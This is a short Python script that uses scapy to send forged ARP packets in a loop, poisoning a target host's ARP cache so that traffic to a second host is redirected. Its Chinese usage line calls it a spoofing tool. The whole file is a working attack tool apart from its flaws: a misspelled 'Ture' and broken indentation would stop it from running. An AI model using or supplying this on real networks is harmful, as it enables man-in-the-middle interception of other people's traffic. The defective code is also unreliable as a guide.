#!/usr/bin/python
#!coding:utf-8
import sys
import time
from scapy.all import *

def arp_spoof(ip1,ip2):
	try:
		pkt=Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip1,psrc=ip2)
	 	sendp(pkt)
	    return
	except:
		return
def main():
	if len(sys.argv) != 3:
		print "使用方法：./arp_spoof.py 目标主机IP 被欺骗主机IP"
		sys.exit()

	ip1=str(sys.argv[1]).strip()
	ip2=str(sys.argv[2]).strip()
	while Ture:
		try:
			arp_spoof(ip1,ip2)
			time.sleep(0.5)
		except KeyboardInterrupt:
			print
			break
if __name__ == '__main__':
		main()	